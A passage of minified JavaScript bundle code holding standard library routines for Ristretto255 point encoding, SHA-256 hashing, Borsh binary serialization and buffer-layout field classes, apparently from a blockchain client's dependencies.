t,{ex:e,ey:r,ez:i,et:n}=this.ep,o=d.ed25519.CURVE.Fp.ORDER,s=d.ed25519.CURVE.Fp.create,a=s(s(i+r)*s(i-r)),u=s(e*r),l=s(u*u),{value:c}=t1(s(a*l)),h=s(c*a),f=s(c*u),p=s(h*f*n);if((0,td.isNegativeLE)(n*p,o)){let i=s(r*tT),n=s(e*tT);e=i,r=n,t=s(h*tX)}else t=f;(0,td.isNegativeLE)(e*p,o)&&(r=s(-r));let g=s((i-r)*t);return(0,td.isNegativeLE)(g,o)&&(g=s(-g)),(0,tp.numberToBytesLE)(g,32)}toHex(){return(0,tp.bytesToHex)(this.toRawBytes())}toString(){return this.toHex()}equals(t){tJ(t);let{ex:e,ey:r}=this.ep,{ex:i,ey:n}=t.ep,o=d.ed25519.CURVE.Fp.create,s=o(e*n)===o(r*i),a=o(r*n)===o(e*i);return s||a}add(t){return tJ(t),new t6(this.ep.add(t.ep))}subtract(t){return tJ(t),new t6(this.ep.subtract(t.ep))}multiply(t){return new t6(this.ep.multiply(t))}multiplyUnsafe(t){return new t6(this.ep.multiplyUnsafe(t))}double(){return new t6(this.ep.double())}negate(){return new t6(this.ep.negate())}}d.RistrettoPoint=(t6.BASE||(t6.BASE=new t6(d.ed25519.ExtendedPoint.BASE)),t6.ZERO||(t6.ZERO=new t6(d.ed25519.ExtendedPoint.ZERO)),t6),d.hashToRistretto255=(t,e)=>{let r=e.DST,i="string"==typeof r?(0,k.utf8ToBytes)(r):r,n=(0,tv.expand_message_xmd)(t,i,64,p.sha512);return t6.hashToCurve(n)},d.hash_to_ristretto255=d.hashToRistretto255;var t5=c("dEXSZ"),t4=c("bYkMz"),t9={};Object.defineProperty(t9,"__esModule",{value:!0}),t9.sha224=t9.sha256=t9.SHA256=void 0;var t7={};Object.defineProperty(t7,"__esModule",{value:!0}),t7.HashMD=t7.Maj=t7.Chi=void 0;var et={};function ee(t){if(!Number.isSafeInteger(t)||t<0)throw Error("positive integer expected, got "+t)}function er(t,...e){if(!(t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name))throw Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw Error("Uint8Array expected of length "+e+", got length="+t.length)}function ei(t){if("function"!=typeof t||"function"!=typeof t.create)throw Error("Hash should be wrapped by utils.wrapConstructor");ee(t.outputLen),ee(t.blockLen)}function en(t,e=!0){if(t.destroyed)throw Error("Hash instance has been destroyed");if(e&&t.finished)throw Error("Hash#digest() has already been called")}function eo(t,e){er(t);let r=e.outputLen;if(t.length<r)throw Error("digestInto() expects output buffer of length at least "+r)}Object.defineProperty(et,"__esModule",{value:!0}),et.anumber=ee,et.number=ee,et.abytes=er,et.bytes=er,et.ahash=ei,et.aexists=en,et.aoutput=eo,et.default={number:ee,bytes:er,hash:ei,exists:en,output:eo};var es={};/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */Object.defineProperty(es,"__esModule",{value:!0}),es.Hash=es.nextTick=es.byteSwapIfBE=es.byteSwap=es.isLE=es.rotl=es.rotr=es.createView=es.u32=es.u8=void 0,es.isBytes=function(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name},es.byteSwap32=function(t){for(let e=0;e<t.length;e++)t[e]=(0,es.byteSwap)(t[e])},es.bytesToHex=function(t){(0,et.abytes)(t);let e="";for(let r=0;r<t.length;r++)e+=eu[t[r]];return e},es.hexToBytes=function(t){if("string"!=typeof t)throw Error("hex string expected, got "+typeof t);let e=t.length,r=e/2;if(e%2)throw Error("hex string expected, got unpadded hex of length "+e);let i=new Uint8Array(r);for(let e=0,n=0;e<r;e++,n+=2){let r=ec(t.charCodeAt(n)),o=ec(t.charCodeAt(n+1));if(void 0===r||void 0===o)throw Error('hex string expected, got non-hex character "'+(t[n]+t[n+1])+'" at index '+n);i[e]=16*r+o}return i},es.asyncLoop=ef,es.utf8ToBytes=ed,es.toBytes=ep,es.concatBytes=function(...t){let e=0;for(let r=0;r<t.length;r++){let i=t[r];(0,et.abytes)(i),e+=i.length}let r=new Uint8Array(e);for(let e=0,i=0;e<t.length;e++){let n=t[e];r.set(n,i),i+=n.length}return r},es.checkOpts=function(t,e){if(void 0!==e&&"[object Object]"!==({}).toString.call(e))throw Error("Options should be object or undefined");return Object.assign(t,e)},es.wrapConstructor=function(t){let e=e=>t().update(ep(e)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e},es.wrapConstructorWithOpts=function(t){let e=(e,r)=>t(r).update(ep(e)).digest(),r=t({});return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=e=>t(e),e},es.wrapXOFConstructorWithOpts=function(t){let e=(e,r)=>t(r).update(ep(e)).digest(),r=t({});return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=e=>t(e),e},es.randomBytes=function(t=32){if(ea.crypto&&"function"==typeof ea.crypto.getRandomValues)return ea.crypto.getRandomValues(new Uint8Array(t));if(ea.crypto&&"function"==typeof ea.crypto.randomBytes)return ea.crypto.randomBytes(t);throw Error("crypto.getRandomValues must be defined")};var ea={};Object.defineProperty(ea,"__esModule",{value:!0}),ea.crypto=void 0,ea.crypto="object"==typeof globalThis&&"crypto"in globalThis?globalThis.crypto:void 0,es.u8=t=>new Uint8Array(t.buffer,t.byteOffset,t.byteLength),es.u32=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),es.createView=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),es.rotr=(t,e)=>t<<32-e|t>>>e,es.rotl=(t,e)=>t<<e|t>>>32-e>>>0,es.isLE=68===new Uint8Array(new Uint32Array([0x11223344]).buffer)[0],es.byteSwap=t=>t<<24&0xff000000|t<<8&0xff0000|t>>>8&65280|t>>>24&255,es.byteSwapIfBE=es.isLE?t=>t:t=>(0,es.byteSwap)(t);const eu=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0")),el={_0:48,_9:57,A:65,F:70,a:97,f:102};function ec(t){return t>=el._0&&t<=el._9?t-el._0:t>=el.A&&t<=el.F?t-(el.A-10):t>=el.a&&t<=el.f?t-(el.a-10):void 0}const eh=async()=>{};async function ef(t,e,r){let i=Date.now();for(let n=0;n<t;n++){r(n);let t=Date.now()-i;t>=0&&t<e||(await (0,es.nextTick)(),i+=t)}}function ed(t){if("string"!=typeof t)throw Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function ep(t){return"string"==typeof t&&(t=ed(t)),(0,et.abytes)(t),t}es.nextTick=eh,es.Hash=class{clone(){return this._cloneInto()}},t7.Chi=(t,e,r)=>t&e^~t&r,t7.Maj=(t,e,r)=>t&e^t&r^e&r;class eg extends es.Hash{constructor(t,e,r,i){super(),this.blockLen=t,this.outputLen=e,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(t),this.view=(0,es.createView)(this.buffer)}update(t){(0,et.aexists)(this);let{view:e,buffer:r,blockLen:i}=this,n=(t=(0,es.toBytes)(t)).length;for(let o=0;o<n;){let s=Math.min(i-this.pos,n-o);if(s===i){let e=(0,es.createView)(t);for(;i<=n-o;o+=i)this.process(e,o);continue}r.set(t.subarray(o,o+s),this.pos),this.pos+=s,o+=s,this.pos===i&&(this.process(e,0),this.pos=0)}return this.length+=t.length,this.roundClean(),this}digestInto(t){(0,et.aexists)(this),(0,et.aoutput)(t,this),this.finished=!0;let{buffer:e,view:r,blockLen:i,isLE:n}=this,{pos:o}=this;e[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let t=o;t<i;t++)e[t]=0;!function(t,e,r,i){if("function"==typeof t.setBigUint64)return t.setBigUint64(e,r,i);let n=BigInt(32),o=BigInt(0xffffffff),s=Number(r>>n&o),a=Number(r&o),u=i?4:0,l=i?0:4;t.setUint32(e+u,s,i),t.setUint32(e+l,a,i)}(r,i-8,BigInt(8*this.length),n),this.process(r,0);let s=(0,es.createView)(t),a=this.outputLen;if(a%4)throw Error("_sha2: outputLen should be aligned to 32bit");let u=a/4,l=this.get();if(u>l.length)throw Error("_sha2: outputLen bigger than state");for(let t=0;t<u;t++)s.setUint32(4*t,l[t],n)}digest(){let{buffer:t,outputLen:e}=this;this.digestInto(t);let r=t.slice(0,e);return this.destroy(),r}_cloneInto(t){t||(t=new this.constructor),t.set(...this.get());let{blockLen:e,buffer:r,length:i,finished:n,destroyed:o,pos:s}=this;return t.length=i,t.pos=s,t.finished=n,t.destroyed=o,i%e&&t.buffer.set(r),t}}t7.HashMD=eg;const em=new Uint32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0xfc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x6ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]),ey=new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]),eb=new Uint32Array(64);class ew extends t7.HashMD{constructor(){super(64,32,8,!1),this.A=0|ey[0],this.B=0|ey[1],this.C=0|ey[2],this.D=0|ey[3],this.E=0|ey[4],this.F=0|ey[5],this.G=0|ey[6],this.H=0|ey[7]}get(){let{A:t,B:e,C:r,D:i,E:n,F:o,G:s,H:a}=this;return[t,e,r,i,n,o,s,a]}set(t,e,r,i,n,o,s,a){this.A=0|t,this.B=0|e,this.C=0|r,this.D=0|i,this.E=0|n,this.F=0|o,this.G=0|s,this.H=0|a}process(t,e){for(let r=0;r<16;r++,e+=4)eb[r]=t.getUint32(e,!1);for(let t=16;t<64;t++){let e=eb[t-15],r=eb[t-2],i=(0,es.rotr)(e,7)^(0,es.rotr)(e,18)^e>>>3,n=(0,es.rotr)(r,17)^(0,es.rotr)(r,19)^r>>>10;eb[t]=n+eb[t-7]+i+eb[t-16]|0}let{A:r,B:i,C:n,D:o,E:s,F:a,G:u,H:l}=this;for(let t=0;t<64;t++){let e=l+((0,es.rotr)(s,6)^(0,es.rotr)(s,11)^(0,es.rotr)(s,25))+(0,t7.Chi)(s,a,u)+em[t]+eb[t]|0,c=((0,es.rotr)(r,2)^(0,es.rotr)(r,13)^(0,es.rotr)(r,22))+(0,t7.Maj)(r,i,n)|0;l=u,u=a,a=s,s=o+e|0,o=n,n=i,i=r,r=e+c|0}r=r+this.A|0,i=i+this.B|0,n=n+this.C|0,o=o+this.D|0,s=s+this.E|0,a=a+this.F|0,u=u+this.G|0,l=l+this.H|0,this.set(r,i,n,o,s,a,u,l)}roundClean(){eb.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}t9.SHA256=ew;class ev extends ew{constructor(){super(),this.A=-0x3efa6128,this.B=0x367cd507,this.C=0x3070dd17,this.D=-0x8f1a6c7,this.E=-4191439,this.F=0x68581511,this.G=0x64f98fa7,this.H=-0x4105b05c,this.outputLen=28}}t9.sha256=(0,es.wrapConstructor)(()=>new ew),t9.sha224=(0,es.wrapConstructor)(()=>new ev);var ex={},f=c("6ZWSX"),ek=f.Buffer,eS=ex&&ex.__createBinding||(Object.create?function(t,e,r,i){void 0===i&&(i=r),Object.defineProperty(t,i,{enumerable:!0,get:function(){return e[r]}})}:function(t,e,r,i){void 0===i&&(i=r),t[i]=e[r]}),eB=ex&&ex.__setModuleDefault||(Object.create?function(t,e){Object.defineProperty(t,"default",{enumerable:!0,value:e})}:function(t,e){t.default=e}),eE=ex&&ex.__decorate||function(t,e,r,i){var n,o=arguments.length,s=o<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,r):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,r,i);else for(var a=t.length-1;a>=0;a--)(n=t[a])&&(s=(o<3?n(s):o>3?n(e,r,s):n(e,r))||s);return o>3&&s&&Object.defineProperty(e,r,s),s},eA=ex&&ex.__importStar||function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var r in t)"default"!==r&&Object.hasOwnProperty.call(t,r)&&eS(e,t,r);return eB(e,t),e},e_=ex&&ex.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(ex,"__esModule",{value:!0}),ex.deserializeUnchecked=ex.deserialize=ex.serialize=ex.BinaryReader=ex.BinaryWriter=ex.BorshError=ex.baseDecode=ex.baseEncode=void 0;const eI=e_(c("dEXSZ")),eM=e_(c("bYkMz")),eL=eA(c("kOaA4")),eT=new("function"!=typeof TextDecoder?eL.TextDecoder:TextDecoder)("utf-8",{fatal:!0});ex.baseEncode=function(t){return"string"==typeof t&&(t=ek.from(t,"utf8")),eM.default.encode(ek.from(t))},ex.baseDecode=function(t){return ek.from(eM.default.decode(t))};class eO extends Error{constructor(t){super(t),this.fieldPath=[],this.originalMessage=t}addToFieldPath(t){this.fieldPath.splice(0,0,t),this.message=this.originalMessage+": "+this.fieldPath.join(".")}}ex.BorshError=eO;class eP{constructor(){this.buf=ek.alloc(1024),this.length=0}maybeResize(){this.buf.length<16+this.length&&(this.buf=ek.concat([this.buf,ek.alloc(1024)]))}writeU8(t){this.maybeResize(),this.buf.writeUInt8(t,this.length),this.length+=1}writeU16(t){this.maybeResize(),this.buf.writeUInt16LE(t,this.length),this.length+=2}writeU32(t){this.maybeResize(),this.buf.writeUInt32LE(t,this.length),this.length+=4}writeU64(t){this.maybeResize(),this.writeBuffer(ek.from(new eI.default(t).toArray("le",8)))}writeU128(t){this.maybeResize(),this.writeBuffer(ek.from(new eI.default(t).toArray("le",16)))}writeU256(t){this.maybeResize(),this.writeBuffer(ek.from(new eI.default(t).toArray("le",32)))}writeU512(t){this.maybeResize(),this.writeBuffer(ek.from(new eI.default(t).toArray("le",64)))}writeBuffer(t){this.buf=ek.concat([ek.from(this.buf.subarray(0,this.length)),t,ek.alloc(1024)]),this.length+=t.length}writeString(t){this.maybeResize();let e=ek.from(t,"utf8");this.writeU32(e.length),this.writeBuffer(e)}writeFixedArray(t){this.writeBuffer(ek.from(t))}writeArray(t,e){for(let r of(this.maybeResize(),this.writeU32(t.length),t))this.maybeResize(),e(r)}toArray(){return this.buf.subarray(0,this.length)}}function eR(t,e,r){let i=r.value;r.value=function(...t){try{return i.apply(this,t)}catch(t){if(t instanceof RangeError&&["ERR_BUFFER_OUT_OF_BOUNDS","ERR_OUT_OF_RANGE"].indexOf(t.code)>=0)throw new eO("Reached the end of buffer when deserializing");throw t}}}ex.BinaryWriter=eP;class eC{constructor(t){this.buf=t,this.offset=0}readU8(){let t=this.buf.readUInt8(this.offset);return this.offset+=1,t}readU16(){let t=this.buf.readUInt16LE(this.offset);return this.offset+=2,t}readU32(){let t=this.buf.readUInt32LE(this.offset);return this.offset+=4,t}readU64(){let t=this.readBuffer(8);return new eI.default(t,"le")}readU128(){let t=this.readBuffer(16);return new eI.default(t,"le")}readU256(){let t=this.readBuffer(32);return new eI.default(t,"le")}readU512(){let t=this.readBuffer(64);return new eI.default(t,"le")}readBuffer(t){if(this.offset+t>this.buf.length)throw new eO(`Expected buffer length ${t} isn't within bounds`);let e=this.buf.slice(this.offset,this.offset+t);return this.offset+=t,e}readString(){let t=this.readU32(),e=this.readBuffer(t);try{return eT.decode(e)}catch(t){throw new eO(`Error decoding UTF-8 string: ${t}`)}}readFixedArray(t){return new Uint8Array(this.readBuffer(t))}readArray(t){let e=this.readU32(),r=[];for(let i=0;i<e;++i)r.push(t());return r}}function eU(t){return t.charAt(0).toUpperCase()+t.slice(1)}function eN(t,e,r,i,n){try{if("string"==typeof i)n[`write${eU(i)}`](r);else if(i instanceof Array){if("number"==typeof i[0]){if(r.length!==i[0])throw new eO(`Expecting byte array of length ${i[0]}, but got ${r.length} bytes`);n.writeFixedArray(r)}else if(2===i.length&&"number"==typeof i[1]){if(r.length!==i[1])throw new eO(`Expecting byte array of length ${i[1]}, but got ${r.length} bytes`);for(let e=0;e<i[1];e++)eN(t,null,r[e],i[0],n)}else n.writeArray(r,r=>{eN(t,e,r,i[0],n)})}else if(void 0!==i.kind)switch(i.kind){case"option":null==r?n.writeU8(0):(n.writeU8(1),eN(t,e,r,i.type,n));break;case"map":n.writeU32(r.size),r.forEach((r,o)=>{eN(t,e,o,i.key,n),eN(t,e,r,i.value,n)});break;default:throw new eO(`FieldType ${i} unrecognized`)}else ez(t,r,n)}catch(t){throw t instanceof eO&&t.addToFieldPath(e),t}}function ez(t,e,r){if("function"==typeof e.borshSerialize){e.borshSerialize(r);return}let i=t.get(e.constructor);if(!i)throw new eO(`Class ${e.constructor.name} is missing in schema`);if("struct"===i.kind)i.fields.map(([i,n])=>{eN(t,i,e[i],n,r)});else if("enum"===i.kind){let n=e[i.field];for(let o=0;o<i.values.length;++o){let[s,a]=i.values[o];if(s===n){r.writeU8(o),eN(t,s,e[s],a,r);break}}}else throw new eO(`Unexpected schema kind: ${i.kind} for ${e.constructor.name}`)}function eH(t,e,r,i){try{if("string"==typeof r)return i[`read${eU(r)}`]();if(r instanceof Array){if("number"==typeof r[0])return i.readFixedArray(r[0]);if("number"!=typeof r[1])return i.readArray(()=>eH(t,e,r[0],i));{let e=[];for(let n=0;n<r[1];n++)e.push(eH(t,null,r[0],i));return e}}if("option"===r.kind){if(i.readU8())return eH(t,e,r.type,i);return}if("map"===r.kind){let n=new Map,o=i.readU32();for(let s=0;s<o;s++){let o=eH(t,e,r.key,i),s=eH(t,e,r.value,i);n.set(o,s)}return n}return eq(t,r,i)}catch(t){throw t instanceof eO&&t.addToFieldPath(e),t}}function eq(t,e,r){if("function"==typeof e.borshDeserialize)return e.borshDeserialize(r);let i=t.get(e);if(!i)throw new eO(`Class ${e.name} is missing in schema`);if("struct"===i.kind){let i={};for(let[n,o]of t.get(e).fields)i[n]=eH(t,n,o,r);return new e(i)}if("enum"===i.kind){let n=r.readU8();if(n>=i.values.length)throw new eO(`Enum index: ${n} is out of range`);let[o,s]=i.values[n],a=eH(t,o,s,r);return new e({[o]:a})}throw new eO(`Unexpected schema kind: ${i.kind} for ${e.constructor.name}`)}eE([eR],eC.prototype,"readU8",null),eE([eR],eC.prototype,"readU16",null),eE([eR],eC.prototype,"readU32",null),eE([eR],eC.prototype,"readU64",null),eE([eR],eC.prototype,"readU128",null),eE([eR],eC.prototype,"readU256",null),eE([eR],eC.prototype,"readU512",null),eE([eR],eC.prototype,"readString",null),eE([eR],eC.prototype,"readFixedArray",null),eE([eR],eC.prototype,"readArray",null),ex.BinaryReader=eC,ex.serialize=function(t,e,r=eP){let i=new r;return ez(t,e,i),i.toArray()},ex.deserialize=function(t,e,r,i=eC){let n=new i(r),o=eq(t,e,n);if(n.offset<r.length)throw new eO(`Unexpected ${r.length-n.offset} bytes after deserialized data`);return o},ex.deserializeUnchecked=function(t,e,r,i=eC){return eq(t,e,new i(r))};var eW={};Object.defineProperty(eW,"__esModule",{value:!0}),eW.s16=eW.s8=eW.nu64be=eW.u48be=eW.u40be=eW.u32be=eW.u24be=eW.u16be=eW.nu64=eW.u48=eW.u40=eW.u32=eW.u24=eW.u16=eW.u8=eW.offset=eW.greedy=eW.Constant=eW.UTF8=eW.CString=eW.Blob=eW.Boolean=eW.BitField=eW.BitStructure=eW.VariantLayout=eW.Union=eW.UnionLayoutDiscriminator=eW.UnionDiscriminator=eW.Structure=eW.Sequence=eW.DoubleBE=eW.Double=eW.FloatBE=eW.Float=eW.NearInt64BE=eW.NearInt64=eW.NearUInt64BE=eW.NearUInt64=eW.IntBE=eW.Int=eW.UIntBE=eW.UInt=eW.OffsetLayout=eW.GreedyCount=eW.ExternalLayout=eW.bindConstructorLayout=eW.nameWithProperty=eW.Layout=eW.uint8ArrayToBuffer=eW.checkUint8Array=void 0,eW.constant=eW.utf8=eW.cstr=eW.blob=eW.unionLayoutDiscriminator=eW.union=eW.seq=eW.bits=eW.struct=eW.f64be=eW.f64=eW.f32be=eW.f32=eW.ns64be=eW.s48be=eW.s40be=eW.s32be=eW.s24be=eW.s16be=eW.ns64=eW.s48=eW.s40=eW.s32=eW.s24=void 0;var f=c("6ZWSX");function eF(t){if(!(t instanceof Uint8Array))throw TypeError("b must be a Uint8Array")}function eD(t){return eF(t),f.Buffer.from(t.buffer,t.byteOffset,t.length)}eW.checkUint8Array=eF,eW.uint8ArrayToBuffer=eD;class ej{constructor(t,e){if(!Number.isInteger(t))throw TypeError("span must be an integer");this.span=t,this.property=e}makeDestinationObject(){return{}}getSpan(t,e){if(0>this.span)throw RangeError("indeterminate span");return this.span}replicate(t){let e=Object.create(this.constructor.prototype);return Object.assign(e,this),e.property=t,e}fromArray(t){}}function eK(t,e){return e.property?t+"["+e.property+"]":t}eW.Layout=ej,eW.nameWithProperty=eK,eW.bindConstructorLayout=function(t,e){if("function"!=typeof t)throw TypeError("Class must be constructor");if(Object.prototype.hasOwnProperty.call(t,"layout_"))throw Error("Class is already bound to a layout");if(!(e&&e instanceof ej))throw TypeError("layout must be a Layout");if(Object.prototype.hasOwnProperty.call(e,"boundConstructor_"))throw Error("layout is already bound to a constructor");t.layout_=e,e.boundConstructor_=t,e.makeDestinationObject=()=>new t,Object.defineProperty(t.prototype,"encode",{value(t,r){return e.encode(this,t,r)},writable:!0}),Object.defineProperty(t,"decode",{value:(t,r)=>e.decode(t,r),writable:!0})};class eV extends ej{isCount(){throw Error("ExternalLayout is abstract")}}eW.ExternalLayout=eV;class e$ extends eV{constructor(t=1,e){if(!Number.isInteger(t)||0>=t)throw TypeError("elementSpan must be a (positive) integer");super(-1,e),this.elementSpan=t}isCount(){return!0}decode(t,e=0){return eF(t),Math.floor((t.length-e)/this.elementSpan)}encode(t,e,r){return 0}}eW.GreedyCount=e$;class eZ extends eV{constructor(t,e=0,r){if(!(t instanceof ej))throw TypeError("layout must be a Layout");if(!Number.isInteger(e))throw TypeError("offset must be integer or undefined");super(t.span,r||t.property),this.layout=t,this.offset=e}isCount(){return this.layout instanceof eG||this.layout instanceof eJ}decode(t,e=0){return this.layout.decode(t,e+this.offset)}encode(t,e,r=0){return this.layout.encode(t,e,r+this.offset)}}eW.OffsetLayout=eZ;class eG extends ej{constructor(t,e){if(super(t,e),6<this.span)throw RangeError("span must not exceed 6 bytes")}decode(t,e=0){return eD(t).readUIntLE(e,this.span)}encode(t,e,r=0){return eD(e).writeUIntLE(t,r,this.span),this.span}}eW.UInt=eG;class eJ extends ej{constructor(t,e){if(super(t,e),6<this.span)throw RangeError("span must not exceed 6 bytes")}decode(t,e=0){return eD(t).readUIntBE(e,this.span)}encode(t,e,r=0){return eD(e).writeUIntBE(t,r,this.span),this.span}}eW.UIntBE=eJ;class eY extends ej{constructor(t,e){if(super(t,e),6<this.span)throw RangeError("span must not exceed 6 bytes")}decode(t,e=0){return eD(t).readIntLE(e,this.span)}encode(t,e,r=0){return eD(e).writeIntLE(t,r,this.span),this.span}}eW.Int=eY;class eX extends ej{constructor(t,e){if(super(t,e),6<this.span)throw RangeError("span must not exceed 6 bytes")}decode(t,e=0){return eD(t).readIntBE(e,this.span)}encode(t,e,r=0){return eD(e).writeIntBE(t,r,this.span),this.span}}function eQ(t){let e=Math.floor(t/0x100000000);return{hi32:e,lo32:t-0x100000000*e}}function e0(t,e){return 0x100000000*t+e}eW.IntBE=eX;class e1 extends ej{constructor(t){super(8,t)}decode(t,e=0){let r=eD(t),i=r.readUInt32LE(e);return e0(r.readUInt32LE(e+4),i)}encode(t,e,r=0){let i=eQ(t),n=eD(e);return n.writeUInt32LE(i.lo32,r),n.writeUInt32LE(i.hi32,r+4),8}}eW.NearUInt64=e1;class e2 extends ej{constructor(t){super(8,t)}decode(t,e=0){let r=eD(t);return e0(r.readUInt32BE(e),r.readUInt32BE(e+4))}encode(t,e,r=0){let i=eQ(t),n=eD(e);return n.writeUInt32BE(i.hi32,r),n.writeUInt32BE(i.lo32,r+4),8}}eW.NearUInt64BE=e2;class e3 extends ej{constructor(t){super(8,t)}decode(t,e=0){let r=eD(t),i=r.readUInt32LE(e);return e0(r.readInt32LE(e+4),i)}encode(t,e,r=0){let i=eQ(t),n=eD(e);return n.writeUInt32LE(i.lo32,r),n.writeInt32LE(i.hi32,r+4),8}}eW.NearInt64=e3;class e8 extends ej{constructor(t){super(8,t)}decode(t,e=0){let r=eD(t);return e0(r.readInt32BE(e),r.readUInt32BE(e+4))}encode(t,e,r=0){let i=eQ(t),n=eD(e);return n.writeInt32BE(i.hi32,r),n.writeUInt32BE(i.lo32,r+4),8}}eW.NearInt64BE=e8;class e6 extends ej{constructor(t){super(4,t)}decode(t,e=0){return eD(t).readFloatLE(e)}encode(t,e,r=0){return eD(e).writeFloatLE(t,r),4}}eW.Float=e6;class e5 extends ej{constructor(t){super(4,t)}decode(t,e=0){return eD(t).readFloatBE(e)}encode(t,e,r=0){return eD(e).writeFloatBE(t,r),4}}eW.FloatBE=e5;class e4 extends ej{constructor(t){super(8,t)}decode(t,e=0){return eD(t).readDoubleLE(e)}encode(t,e,r=0){return eD(e).writeDoubleLE(t,r),8}}eW.Double=e4;class e9 extends ej{constructor(t){super(8,t)}decode(t,e=0){return eD(t).readDoubleBE(e)}encode(t,e,r=0){return eD(e).writeDoubleBE(t,r),8}}eW.DoubleBE=e9;class e7 extends ej{constructor(t,e,r){if(!(t instanceof ej))throw TypeError("elementLayout must be a Layout");if(!(e instanceof eV&&e.isCount()||Number.isInteger(e)&&0<=e))throw TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let i=-1;e instanceof eV||!(0<t.span)||(i=e*t.span),super(i,r),this.elementLayout=t,this.count=e}getSpan(t,e=0){if(0<=this.span)return this.span;let r=0,i=this.count;if(i instanceof eV&&(i=i.decode(t,e)),0<this.elementLayout.span)r=i*this.elementLayout.span;else{let n=0;for(;n<i;)r+=this.elementLayout.getSpan(t,e+r),++n}return r}decode(t,e=0){let r=[],i=0,n=this.count;for(n instanceof eV&&(n=n.decode(t,e));i<n;)r.push(this.elementLayout.decode(t,e)),e+=this.elementLayout.getSpan(t,e),i+=1;return r}encode(t,e,r=0){let i=this.elementLayout,n=t.reduce((t,n)=>t+i.encode(n,e,r+t),0);return this.count instanceof eV&&this.count.encode(t.length,e,r),n}}eW.Sequence=e7;class rt extends ej{constructor(t,e,r){if(!(Array.isArray(t)&&t.reduce((t,e)=>t&&e instanceof ej,!0)))throw TypeError("fields must be array of Layout instances");for(let i of("boolean"==typeof e&&void 0===r&&(r=e,e=void 0),t))if(0>i.span&&void 0===i.property)throw Error("fields cannot contain unnamed variable-length layout");let i=-1;try{i=t.reduce((t,e)=>t+e.getSpan(),0)}catch(t){}super(i,e),this.fields=t,this.decodePrefixes=!!r}getSpan(t,e=0){if(0<=this.span)return this.span;let r=0;try{r=this.fields.reduce((r,i)=>{let n=i.getSpan(t,e);return e+=n,r+n},0)}catch(t){throw RangeError("indeterminate span")}return r}decode(t,e=0){eF(t);let r=this.makeDestinationObject();for(let i of this.fields)if(void 0!==i.property&&(r[i.property]=i.decode(t,e)),e+=i.getSpan(t,e),this.decodePrefixes&&t.length===e)break;return r}encode(t,e,r=0){let i=r,n=0,o=0;for(let i of this.fields){let s=i.span;if(o=0<s?s:0,void 0!==i.property){let n=t[i.property];void 0!==n&&(o=i.encode(n,e,r),0>s&&(s=i.getSpan(e,r)))}n=r,r+=s}return n+o-i}fromArray(t){let e=this.makeDestinationObject();for(let r of this.fields)void 0!==r.property&&0<t.length&&(e[r.property]=t.shift());return e}layoutFor(t){if("string"!=typeof t)throw TypeError("property must be string");for(let e of this.fields)if(e.property===t)return e}offsetOf(t){if("string"!=typeof t)throw TypeError("property must be string");let e=0;for(let r of this.fields){if(r.property===t)return e;0>r.span?e=-1:0<=e&&(e+=r.span)}}}eW.Structure=rt;class re{constructor(t){this.property=t}decode(t,e){throw Error("UnionDiscriminator is abstract")}encode(t,e,r){throw Error("UnionDiscriminator is abstract")}}eW.UnionDiscriminator=re;class rr extends re{constructor(t,e){if(!(t instanceof eV&&t.isCount()))throw TypeError("layout must be an unsigned integer ExternalLayout");super(e||t.property||"variant"),this.layout=t}decode(t,e){return this.layout.decode(t,e)}encode(t,e,r){return this.layout.encode(t,e,r)}}eW.UnionLayoutDiscriminator=rr;class ri extends ej{constructor(t,e,r){let i;if(t instanceof eG||t instanceof eJ)i=new rr(new eZ(t));else if(t instanceof eV&&t.isCount())i=new rr(t);else if(t instanceof re)i=t;else throw TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");if(void 0===e&&(e=null),!(null===e||e instanceof ej))throw TypeError("defaultLayout must be null or a Layout");if(null!==e){if(0>e.span)throw Error("defaultLayout must have constant span");void 0===e.property&&(e=e.replicate("content"))}let n=-1;e&&0<=(n=e.span)&&(t instanceof eG||t instanceof eJ)&&(n+=i.layout.span),super(n,r),this.discriminator=i,this.usesPrefixDiscriminator=t instanceof eG||t instanceof eJ,this.defaultLayout=e,this.registry={};let 